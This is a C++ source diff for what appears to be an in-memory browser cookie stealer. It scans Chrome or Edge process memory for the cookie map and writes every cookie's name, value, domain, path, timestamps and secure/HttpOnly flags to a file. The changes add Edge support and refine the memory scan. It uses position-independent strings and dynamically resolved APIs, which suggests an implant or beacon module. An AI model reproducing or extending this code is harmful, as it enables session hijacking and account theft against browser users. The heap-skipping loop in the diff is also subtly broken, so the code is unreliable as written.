@@ -194,6 +194,15 @@ BOOL MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {
     return TRUE;
 }
 
+BOOL MemCmp(const BYTE* buffer, const BYTE* pattern, size_t szPattern) {
+    for (size_t i = 0; i < szPattern; i++) {
+        if (buffer[i] != pattern[i]) {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
 BYTE* PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress, Pointers* ctx) {
 
     //Copy the pattern
@@ -227,24 +236,35 @@ BOOL FindPattern(const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonst
 
     DFR_CACHE(KERNEL32, VirtualQuery, ctx);
     DFR_CACHE(KERNEL32, ReadProcessMemory, ctx);
+    DFR_CACHE(KERNEL32, GetProcessHeaps, ctx);
 
-    LPVOID heapAddr = ctx->hHeap;
+    const size_t szHeaps = 16;
+    HANDLE heaps[szHeaps] = { 0 };
+    DWORD numHeaps = GetProcessHeaps(szHeaps, heaps);
+
+    if (numHeaps == 0) {
+        PICARR(failed, "[-] GetProcessHeaps failed");
+        WriteLineToFile(failed, ctx);
+        return FALSE;
+    }
 
     while (startAddress < endAddress) {
         if (VirtualQuery(reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
             if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {
 
-                //Do not scan the process heap
-                if (memoryInfo.AllocationBase == heapAddr) {
-                    startAddress += memoryInfo.RegionSize;
-                    continue;
+                //Do not scan the process heaps
+                for (DWORD i = 0; i < numHeaps; i++) {
+                    if (memoryInfo.AllocationBase == heaps[i]) {
+                        startAddress += memoryInfo.RegionSize;
+                        continue;
+                    }
                 }
-
+                
                 BYTE* buffer = (BYTE*)MyHeapAlloc(sizeof(BYTE) * memoryInfo.RegionSize, ctx);
                 SIZE_T bytesRead = 0;
 
                 BYTE* newPattern = PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress), ctx);
-                
+
                 //We are using ReadProcessMemory even as we are running in the target process as sometimes the memory region has already gone stale, or the readable
                 //memory area is not acutally as large as RegionSize suggests... Would love to get rid of ReadProcessMemory if you just know how
                 if (ReadProcessMemory((HANDLE)-1, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
@@ -252,6 +272,12 @@ BOOL FindPattern(const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonst
                         if (MyMemCmp(buffer + i, newPattern, patternSize)) {
                             uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                             uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
+
+                            //Make sure we didn't find ourselves
+                            if (MemCmp((const BYTE*)buffer + i, pattern, patternSize))
+                                continue;
+                            if (MemCmp((const BYTE*)buffer + i, newPattern, patternSize))
+                                continue;
 
                             PICARR(found1, "[*] Found pattern on: ");
                             WriteToFile(found1, ctx);
@@ -296,6 +322,8 @@ BOOL FindPattern(const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonst
 }
 
 #pragma endregion
+
+#pragma region Extraction
 
 void IntToDecStr(char* buf, int value, int minDigits) {
     for (int i = minDigits - 1; i >= 0; i--) {
@@ -447,11 +475,55 @@ void PrintValuesChrome(CanonicalCookieChrome* cookie, Pointers* ctx) {
     WriteToFile(nl, ctx);
 }
 
-//TODO: Add logic for other browsers: We could use ctx to carry the information about the target config
+void PrintValuesEdge(CanonicalCookieEdge* cookie, Pointers* ctx) {
+    PICARR(truetxt, "True");
+    PICARR(falsetxt, "False");
+
+    PICARR(name, "    Name: ");
+    WriteToFile(name, ctx);
+    ReadString(cookie->name, ctx);
+    PICARR(value, "    Value: ");
+    WriteToFile(value, ctx);
+    ReadVector(cookie->value.maybe_encrypted_data_, cookie->value.original_size_, ctx);
+    PICARR(domain, "    Domain: ");
+    WriteToFile(domain, ctx);
+    ReadString(cookie->domain, ctx);
+    PICARR(path, "    Path: ");
+    WriteToFile(path, ctx);
+    ReadString(cookie->path, ctx);
+    PICARR(create, "    Creation time: ");
+    WriteToFile(create, ctx);
+    PrintTimeStamp(cookie->creation_date, ctx);
+    PICARR(expire, "    Expiration time: ");
+    WriteToFile(expire, ctx);
+    PrintTimeStamp(cookie->expiry_date, ctx);
+    PICARR(accessed, "    Last accessed: ");
+    WriteToFile(accessed, ctx);
+    PrintTimeStamp(cookie->last_access_date, ctx);
+    PICARR(updated, "    Last updated: ");
+    WriteToFile(updated, ctx);
+    PrintTimeStamp(cookie->last_update_date, ctx);
+    PICARR(secure, "    Secure: ");
+    WriteToFile(secure, ctx);
+    WriteLineToFile(cookie->secure ? truetxt : falsetxt, ctx);
+    PICARR(httponly, "    HttpOnly: ");
+    WriteToFile(httponly, ctx);
+    WriteLineToFile(cookie->httponly ? truetxt : falsetxt, ctx);
+
+    PICARR(nl, "\n");
+    WriteToFile(nl, ctx);
+}
+
 void ProcessNodeValue(uintptr_t Valueaddr, Pointers* ctx) {
 
-    CanonicalCookieChrome* cookie = reinterpret_cast<CanonicalCookieChrome*>(Valueaddr);
-    PrintValuesChrome(cookie, ctx);
+    if (ctx->targetConfig == Config::Chrome) {
+        CanonicalCookieChrome* cookie = reinterpret_cast<CanonicalCookieChrome*>(Valueaddr);
+        PrintValuesChrome(cookie, ctx);
+    }
+    else {
+        CanonicalCookieEdge* cookie = reinterpret_cast<CanonicalCookieEdge*>(Valueaddr);
+        PrintValuesEdge(cookie, ctx);
+    }
 }
 
 void ProcessNode(const Node& node, Pointers* ctx) {
@@ -493,3 +565,5 @@ void WalkCookieMap(uintptr_t cookieMapAddress, Pointers* ctx) {
 
     return;
 }
+
+#pragma endregion
